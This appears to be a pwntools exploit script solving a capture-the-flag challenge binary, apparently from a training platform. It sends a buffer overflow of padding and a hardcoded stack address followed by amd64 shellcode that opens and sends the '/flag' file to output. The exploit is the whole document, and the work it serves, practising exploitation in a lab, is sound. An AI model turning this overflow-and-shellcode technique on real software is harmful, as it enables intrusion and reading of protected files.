
from pwn import *
p = process("/challenge/toddlerone_level7.0")

a = b'\xff\x01\x01\x68\x02\x01\x00\x40\x01\x10\x20\x80'
p.send(a)
print(p.readuntil(b'read_memory'))
a = """	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 60		
	syscall			
file:
	.string "/flag"
"""
context.arch = "amd64"

a = asm(a)

b = b'A'*25 + b'\x50\xe3\xff\xff\xff\x7f\x00\x00' + a
print(b)
print(hex(len(b)))
p.send(b)
print("sent")
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readall())
